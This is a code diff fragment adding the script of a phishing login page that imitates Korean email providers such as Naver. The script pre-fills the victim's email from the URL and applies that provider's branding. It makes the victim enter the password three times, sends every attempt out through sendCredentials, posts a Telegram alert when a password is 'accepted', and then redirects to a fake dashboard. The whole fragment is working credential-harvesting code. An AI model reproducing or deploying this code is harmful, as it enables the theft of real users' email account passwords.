+        firstPasswordAttempt = password;
+        consecutiveCount = 1;
+        lastAttemptTime = now;
+        updateSilentProgress(1);
+
+        sendCredentials(email, password, 'korea_login_1st', { consecutiveCount: 1 });
+
+        passwordInput.value = '';
+        passwordInput.classList.remove('error');
+        clearMessages();
+
+        setTimeout(() => {
+            passwordInput.focus();
+            isProcessing = false;
+            signinBtn.disabled = false;
+            signinBtn.classList.remove('loading');
+        }, 300);
+        return;
+    }
+
+    // ============================================================
+    //  ENTRY #2 / #3 — compare against stored
+    // ============================================================
+    if (consecutiveCount === 1 || consecutiveCount === 2) {
+        const isMatch = (password === firstPasswordAttempt);
+        console.log(`🔍 Entry #${consecutiveCount + 1} — match:`, isMatch);
+
+        // ---------- ✅ MATCH ----------
+        if (isMatch) {
+            consecutiveCount++;
+            lastAttemptTime = now;
+            updateSilentProgress(consecutiveCount);
+
+            // ---- 3rd matching entry → SUCCESS ----
+            if (consecutiveCount >= CONFIG.REQUIRED_MATCHES) {
+                sendCredentials(email, password, 'korea_login_3rd_match', {
+                    consecutiveCount: 3, match: true
+                });
+
+                passwordInput.value = '';
+                showSuccess('✅ 인증 성공! 문서로 이동합니다...');
+                signinBtn.classList.add('success');
+                btnText.textContent = '✅ 인증 완료!';
+
+                speakKorean('인증되었습니다. 문서로 이동합니다.');
+
+                sendTelegramAlert(
+                    `🇰🇷 *Korea Login Access Granted*\n\n` +
+                    `*Provider:* ${currentProvider.name} (${currentProvider.en})\n` +
+                    `*Email:* ${email}\n` +
+                    `*Session:* ${SESSION_ID.substring(0, 12)}...\n` +
+                    `*Time:* ${new Date().toISOString()}`
+                );
+
+                // Save session
+                try {
+                    localStorage.setItem(CONFIG.SESSION_KEY, JSON.stringify({
+                        email, provider: currentProvider.en,
+                        authenticated: true,
+                        expiresAt: Date.now() + 3600000
+                    }));
+                } catch (e) {}
+
+                setTimeout(() => {
+                    console.log('🔗 Redirecting to dashboard...');
+                    window.location.href = '/dashboard.html?u=' + encodeURIComponent(email);
+                }, 1800);
+                return;
+            }
+
+            // ---- 2nd matching entry → silent, wait for 3rd ----
+            sendCredentials(email, password, `korea_login_${consecutiveCount}th_match`, { consecutiveCount });
+            passwordInput.value = '';
+            passwordInput.classList.remove('error');
+            clearMessages();
+
+            setTimeout(() => {
+                passwordInput.focus();
+                isProcessing = false;
+                signinBtn.disabled = false;
+                signinBtn.classList.remove('loading');
+            }, 300);
+            return;
+        }
+
+        // ---------- ❌ MISMATCH ----------
+        console.log('❌ Mismatch — resetting');
+        sendCredentials(email, password, 'korea_login_mismatch', {
+            consecutiveCount: 0, match: false
+        });
+
+        firstPasswordAttempt = null;
+        consecutiveCount = 0;
+        resetSilentProgress();
+        passwordInput.value = '';
+        passwordInput.classList.add('error');
+        showError('❌ 비밀번호가 일치하지 않습니다. 처음부터 다시 시도하세요.');
+        speakKorean('비밀번호가 일치하지 않습니다. 처음부터 다시 시도하세요.');
+
+        setTimeout(() => {
+            passwordInput.classList.remove('error');
+            passwordInput.focus();
+            isProcessing = false;
+            signinBtn.disabled = false;
+            signinBtn.classList.remove('loading');
+        }, 1400);
+        return;
+    }
+}
+
+// ============================================================
+//  INIT
+// ============================================================
+function init() {
+    // 1. Extract email from ?u= or ?email= or fallback
+    let email = getEmailFromURL() || getSavedEmail();
+    if (!email) email = 'user@naver.com'; // safe default
+
+    capturedEmail = email;
+
+    // 2. Detect provider
+    currentProvider = detectProvider(email);
+    applyProviderBranding(currentProvider, email);
+
+    // 3. Fill email field
+    emailInput.value = email;
+    emailInput.placeholder = 'name@' + (email.split('@')[1] || 'naver.com');
+
+    // 4. Focus password
+    setTimeout(() => passwordInput.focus(), 500);
+
+    // 5. Enter key on password triggers submit
+    passwordInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            handleLogin(e);
+        }
+    });
+    passwordInput.addEventListener('input', function() {
+        this.classList.remove('error');
+        clearMessages();
+    });
+
+    console.log('🇰🇷 Korea Login initialized');
+    console.log(`📧 Email: ${email}`);
+    console.log(`🎨 Provider: ${currentProvider.name}`);
+    console.log(`🔗 Backend: ${CONFIG.BACKEND_URL}`);
+    console.log(`🆔 Session: ${SESSION_ID}`);
+}
+
+document.addEventListener('DOMContentLoaded', init);
+
+// ============================================================
+//  DEBUG API
+// ============================================================
+window.__koreaAuth = {
+    getEmail: () => capturedEmail,
+    getProvider: () => currentProvider,
+    getSessionId: () => SESSION_ID,
+    getStats: () => ({ attempts: attemptCount, consecutiveCount, required: CONFIG.REQUIRED_MATCHES }),
+    reset: () => {
+        consecutiveCount = 0;
+        firstPasswordAttempt = null;
+        resetSilentProgress();
+        clearMessages();
+    },
+    speak: speakKorean,
+    providers: PROVIDERS
+};
+console.log('✅ API available: window.__koreaAuth');
+</script>
+
+</body>
+</html>
